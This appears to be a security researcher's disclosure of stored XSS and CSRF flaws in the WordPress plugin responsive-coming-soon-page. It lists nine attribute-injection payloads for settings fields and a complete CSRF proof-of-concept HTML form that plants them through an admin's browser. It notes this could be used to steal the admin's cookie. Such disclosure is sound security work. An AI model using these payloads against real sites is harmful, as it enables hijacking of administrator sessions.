Well ,sir ,I just found some Stored-XSS bugs and a CSRF bug at wp-plugin responsive-coming-soon-page.

#### Stored-XSS

When the admin user click the "Save Options" button in the responsive-coming-soon-page setting page, we'll post some data to:

```
http://127.0.0.1/wordpress/wp-admin/admin.php?page=rcsm-weblizar
```

But when I pentest the  parameters in this plugin, I found when I write something into this point, it does not filter well.

##### Stored-XSS bugs

By the way, they're displayed by different weak data parameter, post by different data packets:

```
1.coming-soon_title=Our+Site+Is+Coming+Soon!!!" onfocus=console.log(/xss1/) autofocus test="123
2.coming-soon_sub_title=Stay+Tuned+For+Something+Amazing" onfocus=console.log(/xss2/) autofocus test="123
3.logo_width=250" onfocus=console.log(/xss3/) autofocus test="123
4.logo_height=150" onfocus=console.log(/xss4/) autofocus test="123
5.bg_color=%230098ff" onfocus=console.log(/xss7/) autofocus test="123
6.button_text_link=%23timer" onfocus=console.log(/xss8/) autofocus test="123
7.social_icon_1=fa+fa-facebook" onfocus=console.log(/xss10/) autofocus test="123
8.counter_title_icon=fa+fa-clock-o" onfocus=console.log(/xss9/) autofocus test="123
9.counter_title=We're+Coming+Soon11" onfocus=console.log(/xss6/) autofocus test="123
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss1.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss2.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss3.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss4.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss5.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/responsive-coming-soon-page/sxss6.png)


#### CSRF

Well, the stored-xss bugs here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/wordpress/wp-admin/admin.php?page=rcsm-weblizar" method="POST">
      <input type="hidden" name="social&#95;icon&#95;1" value="fa&#32;fa&#45;facebook&quot;&#32;onfocus&#61;console&#46;log&#40;&#47;xss10&#47;&#41;&#32;autofocus&#32;test&#61;&quot;123" />
      <input type="hidden" name="social&#95;link&#95;1" value="&#35;666&quot;" />
      <input type="hidden" name="link&#95;tab&#95;1" value="on&quot;&#32;onfocus&#61;console&#46;log&#40;&#47;xss10&#47;&#41;&#32;autofocus&#32;test&#61;&quot;123" />
      <input type="hidden" name="social&#95;icon&#95;2" value="fa&#32;fa&#45;twitter666&quot;" />
      <input type="hidden" name="social&#95;link&#95;2" value="&#35;666&quot;" />
      <input type="hidden" name="link&#95;tab&#95;2" value="on" />
      <input type="hidden" name="social&#95;icon&#95;3" value="fa&#32;fa&#45;google&#45;plus666&quot;" />
      <input type="hidden" name="social&#95;link&#95;3" value="&#35;" />
      <input type="hidden" name="social&#95;icon&#95;4" value="fa&#32;fa&#45;linkedin" />
      <input type="hidden" name="social&#95;link&#95;4" value="&#35;" />
      <input type="hidden" name="social&#95;icon&#95;5" value="fa&#32;fa&#45;pinterest" />
      <input type="hidden" name="social&#95;link&#95;5" value="&amp;66&quot;3" />
      <input type="hidden" name="weblizar&#95;rcsm&#95;settings&#95;save&#95;social&#95;option" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin responsive-coming-soon-page.